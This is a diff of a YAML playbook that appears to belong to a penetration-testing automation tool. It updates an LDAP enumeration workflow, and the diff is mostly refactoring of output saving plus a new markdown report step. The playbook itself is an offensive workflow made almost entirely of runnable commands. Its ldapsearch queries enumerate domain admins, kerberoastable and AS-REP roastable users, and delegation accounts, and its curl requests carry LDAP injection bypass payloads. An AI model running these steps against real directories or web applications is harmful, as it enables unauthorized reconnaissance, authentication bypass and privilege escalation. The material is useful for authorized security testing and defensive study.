@@ -1,6 +1,6 @@
 name: "LDAP Enumeration"
 description: "LDAP discovery and attack: anonymous binds, attribute enumeration, LDAP injection, pass-back attacks, and directory traversal"
-version: "1.0"
+version: "2.0"
 
 vars:
   domain: ""
@@ -25,10 +25,9 @@ steps:
         name: "Anonymous bind test"
         tool: ldapsearch
         args: ["-x", "-H", "ldap://{dc_ip}", "-b", "{base_dn}",
-               "-s", "base", "(objectClass=*)", "namingContexts",
-               "-o", "{case_dir}/ldap_anon_bind.txt"]
+               "-s", "base", "(objectClass=*)", "namingContexts"]
         timeout: 30
-        artifacts: ["{case_dir}/ldap_anon_bind.txt"]
+        save: "{case_dir}/ldap_anon_bind.txt"
 
       - id: ldap_nmap
         name: "LDAP port scan"
@@ -42,9 +41,9 @@ steps:
         name: "Null session / simple bind"
         tool: ldapsearch
         args: ["-x", "-H", "ldap://{dc_ip}",
-               "-b", "{base_dn}",
-               "-o", "{case_dir}/ldap_null_session.txt"]
+               "-b", "{base_dn}"]
         timeout: 30
+        save: "{case_dir}/ldap_null_session.txt"
 
   # ---- Phase 2: Object enumeration ----
   - id: object_enum
@@ -59,10 +58,9 @@ steps:
                "-D", "{bind_dn}", "-w", "{password}",
                "-b", "{base_dn}",
                "(objectClass=user)",
-               "sAMAccountName userPrincipalName mail memberOf distinguishedName",
-               "-o", "{case_dir}/ldap_users.txt"]
+               "sAMAccountName userPrincipalName mail memberOf distinguishedName"]
         timeout: 120
-        artifacts: ["{case_dir}/ldap_users.txt"]
+        save: "{case_dir}/ldap_users.txt"
 
       - id: groups_all
         name: "All group objects"
@@ -71,9 +69,9 @@ steps:
                "-D", "{bind_dn}", "-w", "{password}",
                "-b", "{base_dn}",
                "(objectClass=group)",
-               "name member distinguishedName",
-               "-o", "{case_dir}/ldap_groups.txt"]
+               "name member distinguishedName"]
         timeout: 120
+        save: "{case_dir}/ldap_groups.txt"
 
       - id: computers_all
         name: "All computer objects"
@@ -82,9 +80,9 @@ steps:
                "-D", "{bind_dn}", "-w", "{password}",
                "-b", "{base_dn}",
                "(objectClass=computer)",
-               "dNSHostName operatingSystem distinguishedName",
-               "-o", "{case_dir}/ldap_computers.txt"]
+               "dNSHostName operatingSystem distinguishedName"]
         timeout: 120
+        save: "{case_dir}/ldap_computers.txt"
 
       - id: domain_admins
         name: "Domain Admin group members"
@@ -93,10 +91,9 @@ steps:
                "-D", "{bind_dn}", "-w", "{password}",
                "-b", "{base_dn}",
                "(&(objectClass=group)(cn=Domain Admins))",
-               "member",
-               "-o", "{case_dir}/ldap_domain_admins.txt"]
+               "member"]
         timeout: 60
-        artifacts: ["{case_dir}/ldap_domain_admins.txt"]
+        save: "{case_dir}/ldap_domain_admins.txt"
 
       - id: spn_users
         name: "Users with SPNs (kerberoastable)"
@@ -105,9 +102,9 @@ steps:
                "-D", "{bind_dn}", "-w", "{password}",
                "-b", "{base_dn}",
                "(&(objectClass=user)(servicePrincipalName=*))",
-               "servicePrincipalName sAMAccountName",
-               "-o", "{case_dir}/ldap_spn_users.txt"]
+               "servicePrincipalName sAMAccountName"]
         timeout: 60
+        save: "{case_dir}/ldap_spn_users.txt"
 
       - id: asrep_users
         name: "AS-REP roastable users (DONT_REQ_PREAUTH)"
@@ -116,9 +113,9 @@ steps:
                "-D", "{bind_dn}", "-w", "{password}",
                "-b", "{base_dn}",
                "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
-               "sAMAccountName userAccountControl",
-               "-o", "{case_dir}/ldap_asrep_users.txt"]
+               "sAMAccountName userAccountControl"]
         timeout: 60
+        save: "{case_dir}/ldap_asrep_users.txt"
 
       - id: delegation_users
         name: "Constrained delegation users"
@@ -127,9 +124,9 @@ steps:
                "-D", "{bind_dn}", "-w", "{password}",
                "-b", "{base_dn}",
                "(&(objectClass=user)(msDS-AllowedToDelegateTo=*))",
-               "sAMAccountName msDS-AllowedToDelegateTo",
-               "-o", "{case_dir}/ldap_delegation.txt"]
+               "sAMAccountName msDS-AllowedToDelegateTo"]
         timeout: 60
+        save: "{case_dir}/ldap_delegation.txt"
 
   # ---- Phase 3: Attribute discovery ----
   - id: attr_discovery
@@ -144,9 +141,9 @@ steps:
                "-D", "{bind_dn}", "-w", "{password}",
                "-b", "CN=Schema,CN=Configuration,{base_dn}",
                "(lDAPDisplayName=*)",
-               "lDAPDisplayName attributeSyntax",
-               "-o", "{case_dir}/ldap_schema_attributes.txt"]
+               "lDAPDisplayName attributeSyntax"]
         timeout: 60
+        save: "{case_dir}/ldap_schema_attributes.txt"
 
       - id: gpo_list
         name: "GPO objects"
@@ -155,9 +152,9 @@ steps:
                "-D", "{bind_dn}", "-w", "{password}",
                "-b", "CN=Policies,CN=System,{base_dn}",
                "(objectClass=groupPolicyContainer)",
-               "displayName cn gPCFileSysPath",
-               "-o", "{case_dir}/ldap_gpos.txt"]
+               "displayName cn gPCFileSysPath"]
         timeout: 60
+        save: "{case_dir}/ldap_gpos.txt"
 
   # ---- Phase 4: LDAP injection ----
   - id: ldap_inject
@@ -168,33 +165,48 @@ steps:
       - id: inject_simple
         name: "Basic injection test (wildcard)"
         tool: curl
-        args: ["-s", "{target}/?user=*)(uid=*))(|(uid=*",
-               "-o", "{case_dir}/ldap_inject_wildcard.txt"]
+        args: ["-s", "{target}/?user=*)(uid=*))(|(uid=*"]
         timeout: 30
+        save: "{case_dir}/ldap_inject_wildcard.txt"
 
       - id: inject_and
         name: "Injection — AND bypass"
         tool: curl
-        args: ["-s", "{target}/?user=admin)(&)",
-               "-o", "{case_dir}/ldap_inject_and.txt"]
+        args: ["-s", "{target}/?user=admin)(&)"]
         timeout: 30
+        save: "{case_dir}/ldap_inject_and.txt"
 
       - id: inject_or
         name: "Injection — OR bypass"
         tool: curl
-        args: ["-s", "{target}/?user=*)(|(uid=*",
-               "-o", "{case_dir}/ldap_inject_or.txt"]
+        args: ["-s", "{target}/?user=*)(|(uid=*"]
         timeout: 30
+        save: "{case_dir}/ldap_inject_or.txt"
 
   # ---- Phase 5: Report ----
   - id: report
-    name: "LDAP enumeration note"
+    name: "LDAP enumeration report"
+    type: report
+    format: markdown
+    title: "LDAP Enumeration Report — {domain}"
+    output: "{case_dir}/ldap-report.md"
+    sections:
+      - heading: "Target"
+        body: "- Domain: {domain}\n- DC: {dc_ip}"
+      - heading: "Connection Testing"
+        body: "- Anonymous bind: {case_dir}/ldap_anon_bind.txt\n- LDAP nmap: {case_dir}/ldap_nmap.txt\n- Null session: {case_dir}/ldap_null_session.txt"
+      - heading: "Object Enumeration"
+        body: "- Users: {case_dir}/ldap_users.txt\n- Groups: {case_dir}/ldap_groups.txt\n- Computers: {case_dir}/ldap_computers.txt\n- Domain admins: {case_dir}/ldap_domain_admins.txt\n- SPN users (kerberoast): {case_dir}/ldap_spn_users.txt\n- AS-REP users: {case_dir}/ldap_asrep_users.txt\n- Delegation users: {case_dir}/ldap_delegation.txt"
+      - heading: "Attribute Discovery"
+        body: "- Schema attributes: {case_dir}/ldap_schema_attributes.txt\n- GPOs: {case_dir}/ldap_gpos.txt"
+      - heading: "LDAP Injection"
+        body: "- Wildcard test: {case_dir}/ldap_inject_wildcard.txt\n- AND bypass: {case_dir}/ldap_inject_and.txt\n- OR bypass: {case_dir}/ldap_inject_or.txt"
+
+postflight:
+  - id: cleanup
     type: log
-    message: |
-      LDAP enumeration complete for {domain}.
-      Results in {case_dir}/:
-      - Users: ldap_users.txt, ldap_domain_admins.txt
-      - Groups: ldap_groups.txt
-      - Computers: ldap_computers.txt
-      - Targets: ldap_spn_users.txt, ldap_asrep_users.txt, ldap_delegation.txt
-      - GPOs: ldap_gpos.txt
+    message: "LDAP enumeration complete — {case_dir}"
+  - id: notify_done
+    type: notify
+    level: success
+    message: "LDAP enumeration finished for {domain}. Results in {case_dir}"
